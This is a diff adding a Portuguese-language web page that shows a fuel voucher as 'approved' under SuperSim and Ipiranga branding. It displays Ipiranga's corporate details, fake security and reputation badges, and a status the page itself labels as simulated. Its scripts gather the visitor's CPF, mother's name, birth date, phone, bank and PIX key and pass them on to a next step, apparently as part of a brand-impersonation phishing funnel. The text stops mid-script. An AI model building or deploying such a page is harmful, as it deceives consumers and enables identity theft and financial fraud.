@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <link rel="icon" type="image/png" href="/images/favicon-supersim.png">
+
+
+  <script src="js/latest-6.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    window.pixelId = "6a3acb84a0439721cfce74e3";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <!-- Bullster Pixel -->
+  <script>
+    window.pixelToken = '600f0a9c-c1ff-4e2f-8b18-fa28a712f3cc';
+    (function (d, s) {
+      var js = d.createElement(s);
+      js.src = 'https://cdn.bullster.app/pixel.js';
+      js.async = true;
+      d.head.appendChild(js);
+    })(document, 'script');
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Escolha o Vencimento — SuperSim</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap');
+
+    :root {
+      --green: #7c5914;
+      --green-dark: #624710;
+      --green-light: #f6f2e9;
+      --green-subtle: #faf8f2;
+      --bg: #f7f6f4;
+      --card: #FFFFFF;
+      --text: #201c18;
+      --text-mid: #4b453d;
+      --text-light: #7d776e;
+      --border: #ebe9e5;
+      --border-light: #f6f5f3;
+      --warning: #f59e0b;
+      --radius: 18px;
+      --shadow: 0 4px 24px rgba(0, 0, 0, .06), 0 1px 2px rgba(0, 0, 0, .04);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 72px;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    /* HEADER */
+    header.header {
+      background: #FFD100;
+      padding: 14px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 1px 0 var(--border);
+    }
+
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .menu-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--border-light);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      border: 1px solid var(--border);
+      transition: all 0.2s ease;
+    }
+
+    .menu-icon:hover {
+      background: var(--border);
+      transform: scale(1.05);
+    }
+
+    .menu-icon svg {
+      width: 18px;
+      height: 18px;
+      color: var(--text-mid);
+      stroke-width: 2.5;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      user-select: none;
+    }
+
+    .logo-cred {
+      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+      color: #201c18;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .logo-diamond {
+      width: 7px;
+      height: 7px;
+      background: #7c5914;
+      transform: rotate(45deg);
+      margin: 0 8px;
+      border-radius: 1.5px;
+      flex-shrink: 0;
+    }
+
+    .logo-on {
+      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+      color: #7c5914;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 1px;
+    }
+
+    .user-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text);
+      max-width: 120px;
+      text-overflow: ellipsis;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    .user-cpf {
+      font-size: 11px;
+      color: var(--text-light);
+      letter-spacing: 0.3px;
+    }
+
+    .user-icon-wrapper {
+      width: 40px;
+      height: 40px;
+      background: #f6f2e900;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #002fff;
+      color: var(--green-dark);
+    }
+
+    .user-icon-wrapper svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    /* MAIN */
+    .main-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 550px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 32px 24px;
+      border: 1px solid var(--border);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .section {
+      display: none;
+    }
+
+    .section.active {
+      display: block;
+      animation: fadeIn 0.4s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    .section-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: var(--text);
+      margin-bottom: 10px;
+      text-align: center;
+      letter-spacing: -0.3px;
+    }
+
+    .section-subtitle {
+      font-size: 0.95rem;
+      color: var(--text-light);
+      margin-bottom: 24px;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .user-greeting {
+      color: var(--green);
+      font-weight: 700;
+    }
+
+    /* INFO CARDS */
+    .info-card {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: #fcfbfa;
+      border: 1.5px solid #ebe9e5;
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+    }
+
+    .info-icon {
+      width: 40px;
+      height: 40px;
+      min-width: 40px;
+      background: #005bb9;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .info-icon svg {
+      width: 20px;
+      height: 20px;
+      color: white;
+    }
+
+    .info-icon.warning {
+      background: var(--warning);
+    }
+
+    .info-text {
+      font-size: 0.85rem;
+      color: #4b453d;
+      font-weight: 500;
+      line-height: 1.5;
+    }
+
+    .info-highlight {
+      font-weight: 700;
+      color: #13bb00;
+    }
+
+    /* ===== Resumo de Custo Efetivo Total (CET) ===== */
+    .cet-card{background:#fff;border:1.5px solid #ebe9e5;border-radius:14px;padding:16px 16px 14px;margin-bottom:16px;box-shadow:0 2px 10px rgba(0,0,0,.03)}
+    .cet-head{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+    .cet-head .cet-ic{width:34px;height:34px;min-width:34px;background:var(--green-light);border-radius:9px;display:flex;align-items:center;justify-content:center}
+    .cet-head .cet-ic svg{width:18px;height:18px;color:var(--green-dark)}
+    .cet-head h3{font-size:.92rem;font-weight:800;color:#201c18;margin:0;line-height:1.2}
+    .cet-head p{font-size:.7rem;color:#7d776e;margin:2px 0 0;font-weight:500}
+    .cet-row{display:flex;justify-content:space-between;align-items:baseline;padding:9px 0;border-bottom:1px dashed #efeeea;font-size:.83rem;gap:12px}
+    .cet-row .cet-l{color:#7d776e;font-weight:500}
+    .cet-row .cet-v{color:#302b26;font-weight:700;text-align:right;white-space:nowrap}
+    #voucherRequestedValue{white-space:normal;overflow-wrap:anywhere;max-width:65%}
+    .cet-row.total{margin-top:4px;padding-top:12px;border-top:2px solid #efeeea;border-bottom:0}
+    .cet-row.total .cet-l{color:#201c18;font-weight:700;font-size:.9rem}
+    .cet-row.total .cet-v{color:var(--green-dark);font-weight:800;font-size:1.02rem}
+    .cet-foot{font-size:.68rem;color:#aca79f;line-height:1.5;margin-top:10px}
+    .voucher-demo{border-color:#dce6f2;border-top:4px solid #ffdc00;border-radius:18px;padding:20px;box-shadow:0 10px 28px -18px rgba(0,59,121,.3)}
+    .voucher-demo .cet-head{margin-bottom:16px;align-items:flex-start}
+    .voucher-demo .cet-ic{background:#edf4ff}
+    .voucher-demo .cet-ic svg,.voucher-demo .cet-head h3{color:#003b79}
+    .voucher-demo .cet-row{padding:12px 0;border-bottom-color:#e7edf5;align-items:center}
+    .voucher-demo .cet-l{flex:1;min-width:0;color:#596b80}
+    .voucher-demo .cet-v{max-width:60%;white-space:normal;overflow-wrap:anywhere;color:#003b79}
+    .voucher-demo-label{display:block;width:fit-content;max-width:100%;margin:8px auto 12px;padding:5px 9px;border-radius:8px;background:#FFD100;color:#003b79;font-size:.68rem;font-weight:800;line-height:1.5;text-align:center}
+    .voucher-demo-status{display:inline-block;border-radius:8px;padding:5px 9px;background:#15803d;color:#fff}
+    .voucher-demo .cet-foot{background:#f5f8fc;padding:12px;border-radius:10px;color:#596b80;font-size:.72rem;line-height:1.6}
+
+    .info-card.warning {
+      background: #fffbeb;
+      border-color: rgba(245, 158, 11, 0.3);
+    }
+
+    .info-card.warning .info-text {
+      color: #92400e;
+    }
+
+    .info-card.warning .info-highlight {
+      color: #78350f;
+    }
+
+    /* BUTTONS */
+    .btn-grid {
+      display: grid;
+      gap: 12px;
+      margin-top: 24px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      background: var(--green);
+      color: white;
+      border: none;
+      padding: 16px 24px;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(140, 103, 30, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        left: -100%;
+      }
+
+      100% {
+        left: 100%;
+      }
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(140, 103, 30, 0.35);
+      background: var(--green-dark);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    .due-date-btn {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 16px;
+      padding: 18px 24px;
+      background: #fcfbfa;
+      border: 1.5px solid #ebe9e5;
+      transition: all 0.25s ease;
+    }
+
+    .due-date-btn:hover {
+      border-color: var(--green);
+      background: #faf8f2;
+    }
+
+    .due-date-number {
+      font-size: 1.8rem;
+      font-weight: 900;
+      color: var(--green);
+    }
+    .due-date-icon {
+      width: 28px;
+      height: 28px;
+      flex-shrink: 0;
+      color: #fff;
+    }
+
+    .due-date-text {
+      text-align: left;
+      flex: 1;
+      min-width: 0;
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #fff;
+    }
+
+    /* LOADING */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      backdrop-filter: blur(4px);
+    }
+
+    .loading-overlay.show {
+      display: flex;
+    }
+
+    .loading-content {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 300px;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid var(--green-light);
+      border-top: 6px solid var(--green);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    /* FOOTER */
+    footer.site-footer {
+      margin-top: auto;
+      background: #FFD100;
+      color: #000000;
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      border-top: 1px solid var(--border);
+    }
+
+    .footer-inner {
+      max-width: 550px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      user-select: none;
+    }
+
+    .footer-logo .logo-cred {
+      font-size: 15px;
+      color: #7d776e;
+    }
+
+    .footer-logo .logo-diamond {
+      width: 5px;
+      height: 5px;
+      margin: 0 6px;
+      background: #7d776e;
+    }
+
+    .footer-logo .logo-on {
+      font-size: 15px;
+      color: #7c5914;
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.75;
+      line-height: 1.5;
+    }
+
+    footer small strong {
+      color: #000000;
+      font-weight: 600;
+    }
+
+    .footer-badges {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-top: 4px;
+    }
+
+    .footer-badges span {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 10px;
+      color: #000000;
+      font-weight: 500;
+    }
+
+    .footer-badges svg {
+      width: 12px;
+      height: 12px;
+      color: #000000;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 24px 20px;
+      }
+
+      .section-title {
+        font-size: 1.25rem;
+      }
+
+      .due-date-number {
+        font-size: 1.6rem;
+      }
+
+      .btn-primary {
+        padding: 15px 20px;
+        font-size: 0.95rem;
+      }
+
+      .info-card {
+        padding: 12px 14px;
+        gap: 12px;
+      }
+
+      .info-icon {
+        width: 36px;
+        height: 36px;
+        min-width: 36px;
+      }
+
+      .info-icon svg {
+        width: 18px;
+        height: 18px;
+      }
+
+      .info-text {
+        font-size: 0.8rem;
+      }
+    }
+
+    .logo-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      user-select: none;
+      text-decoration: none;
+    }
+
+    .logo-row {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-tagline {
+      font-family: 'DM Sans', 'Poppins', sans-serif;
+      font-weight: 600;
+      font-size: 7px;
+      letter-spacing: 2.5px;
+      text-transform: uppercase;
+      color: #7d776e;
+      margin-top: 1px;
+    }
+
+    .footer-tagline {
+      font-family: 'DM Sans', 'Poppins', sans-serif;
+      font-weight: 600;
+      font-size: 6px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #aca79f;
+      margin-top: 1px;
+    }
+  </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1537564750821292');
+fbq('track','PageView');
+(function(){var c=new URLSearchParams(location.search).get('fbclid');if(c)sessionStorage.setItem('_fbclid',c);})();
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1537564750821292&ev=PageView&noscript=1"/></noscript>
+<!-- End Meta Pixel Code -->
+<script src="/js/tracking-shared.js"></script>
+</head>
+
+<body>
+  <header class="header">
+  <link rel="icon" type="image/png" href="/images/favicon-supersim.png">
+
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <img src="images/logoi.png" alt="SuperSim" style="height:34px;width:auto;">
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Usuário</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="secure-strip" style="display:flex;align-items:center;justify-content:center;gap:6px;background:#f6f2ea;border-bottom:1px solid #ece5d6;color:#765513;font-size:11px;font-weight:600;padding:6px 12px;">
+    <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+    Conexão segura · sessão criptografada
+  </div>
+
+  <div class="main-container">
+    <div class="container">
+      <div id="aceite-secao" class="section active">
+        <h1 class="section-title">Condições do Voucher</h1>
+        <p class="section-subtitle">Leia atentamente antes de prosseguir</p>
+
+        <div class="info-card">
+          <div class="info-icon">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
+              </path>
+            </svg>
+          </div>
+          <p class="info-text">
+            A solicitação do voucher de combustível está <span class="info-highlight">aprovada</span>.
+            Finalize o processo para utilizar seu voucher.
+          </p>
+        </div>
+
+        <div class="info-card warning">
+          <div class="info-icon warning">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
+              </path>
+            </svg>
+          </div>
+          <p class="info-text">
+            <span class="info-highlight">Importante:</span> Antes de utilizar um voucher, confirme a validade,
+            os postos participantes e as regras de abastecimento no aplicativo.
+          </p>
+        </div>
+
+        <!-- RESUMO DA SOLICITAÇÃO DE VOUCHER -->
+        <div class="cet-card voucher-demo">
+          <div class="cet-head">
+            <div class="cet-ic">
+              <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round"
+                  d="M9 7h6m-6 4h6m-6 4h4M5 3h14a2 2 0 012 2v14a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2z"></path>
+              </svg>
+            </div>
+            <div>
+              <h3>Resumo do voucher</h3>
+              <p>Confira os dados da solicitação do voucher</p>
+            </div>
+          </div>
+          <span class="voucher-demo-label">Voucher Ipiranga</span>
+          <div class="cet-row"><span class="cet-l">Valor solicitado</span><span class="cet-v" id="voucherRequestedValue">Não informado</span></div>
+          <div class="cet-row"><span class="cet-l">Benefício solicitado</span><span class="cet-v">Voucher de combustível</span></div>
+          <div class="cet-row"><span class="cet-l">Uso pretendido</span><span class="cet-v">Abastecimento</span></div>
+          <div class="cet-row"><span class="cet-l">Situação</span><span class="cet-v"><span class="voucher-demo-status">Aprovado</span></span></div>
+          <div class="cet-row"><span class="cet-l">Aprovação simulada em</span><time class="cet-v" id="voucherSimulatedAt"></time></div>
+          <div class="cet-foot">A participação na campanha de voucher de combustível está sujeita à verificação de elegibilidade. Consulte o regulamento divulgado para confirmar o período da campanha, os critérios de participação, os postos participantes e as condições de uso do benefício.</div>
+        </div>
+        <script>
+          (function () {
+            var arrivedAt = new Date();
+            var timeEl = document.getElementById('voucherSimulatedAt');
+            timeEl.dateTime = arrivedAt.toISOString();
+            timeEl.textContent = arrivedAt.toLocaleString('pt-BR', {
+              day: '2-digit', month: '2-digit', year: 'numeric',
+              hour: '2-digit', minute: '2-digit', second: '2-digit'
+            });
+            var valueEl = document.getElementById('voucherRequestedValue');
+            try {
+              var storedValue = localStorage.getItem('selectedLoanAmount');
+              if (storedValue === null) {
+                storedValue = localStorage.getItem('voucher_valor_solicitado');
+              }
+              var storedAnswers = storedValue === null ? localStorage.getItem('cf_answers') : null;
+              if (storedAnswers !== null) {
+                var chatAnswers = JSON.parse(storedAnswers);
+                if (!chatAnswers || typeof chatAnswers !== 'object' || Array.isArray(chatAnswers)) {
+                  throw new Error('Dados da solicitação do chat inválidos.');
+                }
+                if (Object.prototype.hasOwnProperty.call(chatAnswers, 'valor_aprovado')) {
+                  storedValue = chatAnswers.valor_aprovado;
+                } else if (Object.prototype.hasOwnProperty.call(chatAnswers, 'valor_solicitado')) {
+                  storedValue = chatAnswers.valor_solicitado;
+                }
+              }
+              var valor = Number(storedValue);
+              if ((typeof storedValue === 'number' || typeof storedValue === 'string') && Number.isFinite(valor) && valor > 0) {
+                valueEl.textContent = valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+              } else if (storedValue !== null) {
+                console.error('Valor solicitado do voucher inválido.');
+                valueEl.textContent = 'Valor inválido — revise a solicitação';
+              }
+            } catch (error) {
+              console.error('Não foi possível ler o valor solicitado do voucher.', error);
+              valueEl.textContent = 'Não foi possível carregar';
+            }
+          })();
+        </script>
+
+        <!-- CARNÊ (endereço coletado no chat) -->
+        <div class="carne-note" id="carneNote" style="display:none;align-items:center;gap:12px;background:#faf8f2;border:1.5px solid #e6dfcf;border-radius:14px;padding:13px 15px;margin-bottom:16px;">
+          <div style="width:38px;height:38px;min-width:38px;background:#004bd5;border-radius:10px;display:flex;align-items:center;justify-content:center;">
+            <svg fill="none" stroke="#fff" stroke-width="2" viewBox="0 0 24 24" style="width:20px;height:20px;"><path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+          </div>
+          <div style="line-height:1.4;">
+            <div style="font-size:13px;font-weight:800;color:#211e1b;">Posto de combustível Ipiranga próximo 📮</div>
+            <div style="font-size:12px;color:#69645d;">Voucher disponivel para uso proximo à <b id="carneAddr"></b>, aproveite seu voucher.</div>
+          </div>
+        </div>
+        <script>
+          (function(){ try{ var e=localStorage.getItem('endereco_completo'); if(e){ var n=document.getElementById('carneNote'); document.getElementById('carneAddr').textContent=e; n.style.display='flex'; } }catch(_){} })();
+        </script>
+
+        <div class="btn-grid">
+          <button class="btn-primary" onclick="proximaSecao()">
+            Li e Concordo
+          </button>
+        </div>
+      </div>
+
+      <div id="vencimento-secao" class="section">
+        <h1 class="section-title">
+          Ótimo, <span class="user-greeting" id="nomeGreeting">Cliente</span>!
+        </h1>
+        <p class="section-subtitle">Como você pretende utilizar seu voucher combustível?</p>
+
+        <div class="btn-grid">
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(5)">
+            <svg class="due-date-icon" data-icon="car-front" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 8 2-5h10l2 5M5 17H4V8h16v9h-1M6 17v3M18 17v3M4 12h16M8 17h8"/><path d="M7 12v2M17 12v2"/></svg>
+            <span class="due-date-text"><strong>Carro</strong><br>Abastecimento de carro</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(10)">
+            <svg class="due-date-icon" data-icon="bike" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="5.5" cy="17.5" r="3.5"/><circle cx="18.5" cy="17.5" r="3.5"/><path d="m15 6 2 4h3M12 17.5V14l-3-3 4-3 2 3h2"/><circle cx="14" cy="4" r="1"/></svg>
+            <span class="due-date-text"><strong>Moto</strong><br>Abastecimento de motocicleta</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(15)">
+            <svg class="due-date-icon" data-icon="briefcase-business" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2M2 12a20 20 0 0 0 20 0M12 12v2"/></svg>
+            <span class="due-date-text"><strong>Trabalho</strong><br>Deslocamento profissionais</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(25)">
+            <svg class="due-date-icon" data-icon="route" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="6" cy="6" r="3"/><circle cx="18" cy="18" r="3"/><path d="M9 6h8.5a3.5 3.5 0 0 1 0 7h-11a3.5 3.5 0 0 0 0 7H15"/></svg>
+            <span class="due-date-text"><strong>Viagens</strong><br>Lazer e turismo</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(30)">
+            <svg class="due-date-icon" data-icon="fuel" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 22V5a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v17M2 22h12M3 10h10M13 14h2a2 2 0 0 1 2 2v2a2 2 0 0 0 4 0V9l-3-3"/><path d="M18 6v3h3"/></svg>
+            <span class="due-date-text"><strong>Outros</strong><br>Outras necessidades</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <p class="loading-text">Processando sua escolha...</p>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo">
+        <img src="images/logoi.png" alt="SuperSim" style="height:24px;width:auto;">
+      </div>
+      <small><strong>Ipiranga Produtos de Petróleo S.A.</strong><br>CNPJ:  33.337.122/0001-27 — Rio de Janeiro - RJ, CEP 20.031-170</small>
+      <div class="footer-badges">
+        <span>
+          <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+            </path>
+          </svg>
+          SSL Seguro
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+            </path>
+          </svg>
+          Dados protegidos
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4">
+            </path>
+          </svg>
+          Instituição regulada
+        </span>
+      </div>
+      <div style="display:inline-flex;align-items:center;gap:7px;background:#fff;border:1px solid #e4e1db;border-radius:10px;padding:6px 11px;margin-top:14px;">
+        <span style="font-family:'Sora',sans-serif;font-weight:800;font-size:11px;color:#363330;display:inline-flex;align-items:center;">Reclame<b style="background:#9a6f19;color:#fff;padding:1px 4px;border-radius:4px;margin-left:2px;">AQUI</b></span>
+        <span style="font-size:11px;font-weight:700;color:#9a6f19;">★ 8.9 · ÓTIMO</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function loadUserData() {
+      const nome = localStorage.getItem('nome');
+      if (nome) {
+        const nomes = nome.trim().split(' ');
+        const primeiroNome = nomes[0];
+        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+        document.getElementById('userName').textContent = ultimoNome ? `${primeiroNome} ${ultimoNome}` : primeiroNome;
+        document.getElementById('nomeGreeting').textContent = primeiroNome;
+      }
+
+      const cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        if (cpfLimpo.length === 11) {
+          document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', loadUserData);
+
+    function proximaSecao() {
+      document.getElementById('aceite-secao').classList.remove('active');
+      document.getElementById('vencimento-secao').classList.add('active');
+    }
+
+    function selectDueDate(day) {
+      document.getElementById('loadingOverlay').classList.add('show');
+      localStorage.setItem('dueDate', day.toString());
+
+      const urlParams = new URLSearchParams(window.location.search);
+      urlParams.set('dueDate', day);
+
+      const importantParams = [
+        'income', 'salaryDay', 'occupation', 'education', 'utm_source', 'utm_campaign',
+        'utm_medium', 'utm_content', 'utm_term', 'name', 'email', 'document', 'nome_mae',
+        'data_nasc', 'telephone', 'telefone', 'cpf', 'nome', 'banco', 'chave_pix',
+        'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment'
+      ];
+
+      importantParams.forEach(param => {
+        const value = localStorage.getItem(param);
+        if (value && !urlParams.has(param)) {
+          urlParams.set(param, value);
+        }
+      });
+
+      const finalParams = urlParams.toString();
+      const targetUrl = finalParams ? `8.html?${finalParams}` : '8.html';
+
+      setTimeout(() => {
